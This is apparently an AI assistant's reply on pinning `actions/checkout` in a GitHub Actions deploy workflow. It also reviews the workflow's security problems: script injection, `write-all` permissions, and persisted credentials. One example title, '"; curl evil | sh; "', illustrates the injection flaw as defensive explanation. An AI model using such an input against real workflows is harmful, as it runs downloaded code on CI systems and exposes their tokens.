I couldn't pin anything. This session only gives me read and search tools: I can't edit files, run shell commands or call the GitHub API. Pinning needs a real commit SHA looked up from GitHub, and I won't write one from memory because a wrong SHA either breaks the run or points at code nobody checked.

## What needs pinning

The repository has one workflow, `.github/workflows/deploy.yml`, and it uses one action:

- `.github/workflows/deploy.yml:13`: `uses: actions/checkout@v4`

There are no composite actions, reusable workflows or `dependabot.yml`.

## How to pin it

Look up the current release and its commit SHA, rather than pinning whatever `v4` points to now. The latest `actions/checkout` is probably a newer major version, so check its release notes before switching:

```sh
gh api repos/actions/checkout/releases/latest --jq .tag_name      # e.g. vX.Y.Z
gh api repos/actions/checkout/commits/<that tag> --jq .sha        # 40-char SHA
```

Then line 13 becomes:

```yaml
      - uses: actions/checkout@<40-char-sha> # vX.Y.Z
        with:
          persist-credentials: false
```

You could also run `pinact run` or `ratchet pin` on a clean tree to do the rewrite, then review the diff.

## Bigger problems in this workflow than the unpinned tag

1. **Script injection (line 14).** The workflow runs on `pull_request`, so a pull request author controls `${{ github.event.pull_request.title }}`. That value is pasted into the shell script before it runs, so a title like `"; curl evil | sh; "` would execute. Pass it through an environment variable instead:
   ```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
   ```
2. **`permissions: write-all` (line 7).** Every scope of the job's token has write access. Use `permissions: {}` at the top, and give the job only `contents: read` unless the deploy needs more.
3. **No `timeout-minutes`.** Without it a job can run for up to 6 hours. Set a small limit, such as 10.
4. **No `persist-credentials: false` on checkout.** Without it the token is saved in `.git/config` where later steps can read it. The snippet above adds it.

If you give me edit and shell access, I'll make these changes, look up the SHA, and run `actionlint` and `zizmor` on the result. Or run the two `gh api` commands above and paste the output here, and I'll write out the full corrected file.
